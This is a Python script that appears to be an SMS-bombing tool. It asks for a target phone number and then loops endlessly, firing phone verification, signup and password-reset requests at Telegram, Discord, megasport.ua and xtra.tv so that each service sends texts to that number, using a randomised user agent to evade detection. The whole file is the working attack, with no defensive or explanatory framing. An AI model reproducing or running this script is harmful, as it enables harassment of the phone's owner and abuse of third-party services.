import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Beeante HOMep tenedona: (6es +)')



while True:

 try:
     print('telegram')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "telegram"')
 try:
     print('discord')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "discord"')
 try:
     print('megasport')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "megasport"')
 try:
     print('xtra.tv')
     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "xtra.tv"')
 try:
     print('xtra.tv-pass')
     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено "xtra.tv-pass"')
     time.sleep(5)
